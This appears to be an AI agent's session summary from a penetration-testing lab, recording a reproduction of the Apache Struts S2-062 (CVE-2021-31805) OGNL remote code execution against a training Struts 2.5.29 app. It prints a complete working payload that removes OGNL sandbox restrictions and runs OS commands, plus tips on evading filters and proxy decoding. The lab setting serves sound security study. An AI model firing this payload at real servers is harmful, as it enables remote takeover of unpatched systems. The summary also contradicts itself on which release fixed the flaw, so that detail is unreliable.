thread_id: 018fe588-a5be-7c29-af39-49cfacf1e8b8
updated_at: 2026-05-28T07:21:11+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\05\28\rollout-2026-05-28T15-14-11-018fe588-a5be-7c29-af39-49cfacf1e8b8.jsonl
cwd: \\?\C:\Workspace\pentest-lab

# Reproduced Struts2 S2-062 (CVE-2021-31805) OGNL evaluation RCE on a training Struts 2.5.29 app.

Rollout context: cwd was `C:\Workspace\pentest-lab`, lab Tomcat + Struts 2.5.29 app (S2-062 unpatched). This CVE reopened the double-evaluation path that S2-061's incomplete fix left behind.

## Task 1: Trigger OGNL evaluation on a `%{}` field → RCE

Outcome: success

Preference signals:
- Chinese narration; payloads in English.
- The user wanted one working payload and a short explanation of WHY 061's fix was incomplete.

Key steps:
- Confirmed target is Struts 2.5.29 via a `HEAD /struts/index.action` and X-Powered-By header.
- Located an input field that got re-evaluated as OGNL — the "id" parameter on the training app's `edit.action`.
- Sent: `id=%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}`
- Response body contained the `id` output.

Failures and how to do differently:
- First attempt used the S2-045 payload — filtered by 2.5.29. Switched to the DEFAULT_MEMBER_ACCESS bypass form.
- URL encoding of `%` had to be double-encoded (`%25`) because the front reverse proxy decoded once.

Reusable knowledge:
- S2-062's root cause: 2.5.30 patch to S2-061 blocked most bypasses but the double-evaluation on tag re-render survived. Fixed properly in 2.5.30.
- OGNL DEFAULT_MEMBER_ACCESS clear is the standard first stage in modern Struts payloads — clears both class and package exclusions.

References:
- [1] Payload: `s2_062_payload.txt`
- [2] Test app: Struts 2.5.29 on Tomcat 9
- [3] Reference: Apache Struts advisory CVE-2021-31805
